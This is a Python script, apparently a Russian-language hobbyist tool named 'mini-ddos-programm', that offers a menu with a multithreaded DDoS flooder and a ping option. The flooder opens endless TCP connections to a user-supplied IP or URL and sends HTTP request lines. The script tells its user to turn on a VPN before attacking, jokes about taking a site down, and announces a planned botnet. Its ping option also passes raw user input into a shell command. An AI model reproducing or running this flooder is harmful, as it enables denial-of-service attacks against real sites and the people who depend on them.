
#version 5.5
#by SKATT
import os
print('Установка дополнительных модулей...')
os.system('pip install requests')
os.system('pip install colorama')
print('Импортирую модули...')
import colorama
import sys
import platform
import socket
import requests
import threading
import time
from time import ctime
print('Импортирую цвета...')
from colorama import Fore
colorama.init()
print('Запуск программы...')
version = 'v5.5'
print(version)
print(Fore.GREEN + 'Created by SKATT')
time.sleep(1)
print(Fore.BLUE + 'Проверяю соединение с интернетом')
try:
    requests.get("https://api.github.com", timeout=4)
    print('Проверка завершена успешно!')
except:
    print(
        f"{Fore.RED}[!] {Fore.MAGENTA}Вы не подключены к интернету \n пожалуйста проверте соединение с интернетом \n и запустите программу заново{Fore.RESET}"
    )
    time.sleep(1)
    sys.exit()
time.sleep(1)
print(Fore.YELLOW + 'Проверка Обновлений')
VERSION_URL = 'https://api.github.com/repos/POHel/mini-ddos-programm/releases/latest'
DOWNLOAD_URL = 'https://github.com/POHel/mini-ddos-programm/archive/refs/heads/main.zip'

def update_program(owner, repo, file):
    response = requests.get(VERSION_URL.format(owner=owner, repo=repo)).json()
    latest_version = response['tag_name']

    if latest_version != version:
        print(Fore.MAGENTA + '[!]' + Fore.YELLOW + 'Доступно обновление')
        print(Fore.BLUE + 'Загружаю обновление')
        download_url = DOWNLOAD_URL.format(owner=owner, repo=repo, file=file)
        r = requests.get(download_url, allow_redirects=True)
        open(file, 'wb').write(r.content)
        print(Fore.MAGENTA + '[!]' + Fore.GREEN + 'Обновление Загружено')

    if latest_version == version:
        print(Fore.MAGENTA + '[!]' + Fore.GREEN + 'Установлена самая последняя версия')

if __name__ == '__main__':
    update_program('POHel', 'mini-ddos-programm', 'main.zip')
time.sleep(1)

print(Fore.BLUE + 'Определяю OS...')
time.sleep(1)
print('Ваша ос: ', os.name)
time.sleep(3)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
print(Fore.RED + '''

                     ▄█▀▀▀█▄████▀▀▀██▄   ▄▄█▀▀██▄  ▄█▀▀▀█▄█
                    ▄██    ▀█ ██    ▀██▄██▀    ▀██▄██    ▀█
                    ▀███▄     ██     ▀███▀      ▀█████▄
                      ▀█████▄ ██      ███        ██ ▀█████▄
                    ▄     ▀██ ██     ▄███▄      ▄██     ▀██
                    ██     ██ ██    ▄██▀██▄    ▄██▀█     ██
                    █▀█████▀▄████████▀   ▀▀████▀▀ █▀█████▀
                                Created by SKATT
''')
time.sleep(0.5)
print(version)
time.sleep(1)
print(f"""
    {Fore.RED}=== Python info:
    {Fore.GREEN}PYTHON VERSION: {platform.python_version()}
    {Fore.GREEN}PYTHON BUILD: {'{}, DATE: {}'.format(*platform.python_build())}
    {Fore.GREEN}PYTHON COMPILER: {platform.python_compiler()}
    {Fore.GREEN}SCRIPT LOCATION: {os.path.dirname(os.path.realpath(sys.argv[0]))}
    {Fore.GREEN}CURRENT LOCATION: {os.getcwd()}
    {Fore.RED}=== System info:
    {Fore.BLUE}SYSTEM: {platform.system()}
    {Fore.BLUE}RELEASE: {platform.release()}
    {Fore.BLUE}VERSION: {platform.version()}
    {Fore.BLUE}ARCHITECTURE: {'{} {}'.format(*platform.architecture())}
    {Fore.BLUE}PROCESSOR: {platform.processor()}
    {Fore.BLUE}MACHINE: {platform.machine()}
    {Fore.BLUE}NODE: {platform.node()}
    {Fore.BLUE}TIME: {ctime()}
    {Fore.RESET}
""")
time.sleep(1)
print(Fore.YELLOW + '''
    !О БУДУЮЩИХ ОБНОВЛЕНИЯХ!
    Планирую сделать типо ботнет для автоматизации запуска программы на всех имеющихся у вас машинах 
    (чтобы суммировать вычислительную мощность)
    А дальше предложите свои идеи
''')
time.sleep(1)
while True:
    print(f'''
    {Fore.MAGENTA}Выберите действие:
    {Fore.MAGENTA}[1] {Fore.BLUE}DDOS-(by ip or url)
    {Fore.MAGENTA}[2] {Fore.BLUE}ping
    ''')
    print(Fore.GREEN + '')
    number = (input('Введите цифру: '))
    if number == '1':
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
        print(Fore.RED + '''
            Если возникают ошибки, то вот возможные причины:
            1)Плохое соединение с интернетом
            2)Некорректно введён IP адрес
            3)Сервер не может обработать ваши звпросы
            (это хорошо, кто не знает это означает что сервер начал лагать или же это 1 пункт)
            4)Возможно вы положили сайт :)
        ''')
        print(Fore.MAGENTA + '[!]' + Fore.RED + 'Чтобы остановить програму нажмите ctrl + c, или просто перезапустите программу \n')
        print(Fore.RED + '[!]' + Fore.YELLOW + 'Перед атакой советую включить VPN!!! \n')
        target = input(Fore.GREEN + 'введите IP или URL: ')
        print('[http (80) / https (443)]')
        port = int(input('Введите порт: '))
        attack_num = 1

        def attack():
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                                        
                global attack_num
                attack_num += 1
                print(attack_num)

                s.close()

        print(f'''
{Fore.YELLOW}[!]{Fore.RED}Внимание! Настоятельно рекомендую выберать кол-во потоков\n по мощности процессора, чтобы избежать поломки железа{Fore.YELLOW}[!]
            {Fore.GREEN}
            ''')
        potok = int(input('Введите Кол-во потоков: '))
        print(Fore.RESET + '')
        for i in range(potok):
            thread = threading.Thread(target=attack)
            thread.start()

    elif number == '2':
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
        print(Fore.CYAN + '')
        print('starting ping...')
        time.sleep(1.5)
        piip = input('Введите ip: ')
        os.system('ping ' + piip + ' -t')
    else:
        print(Fore.RED + 'Выбрано не верное число')

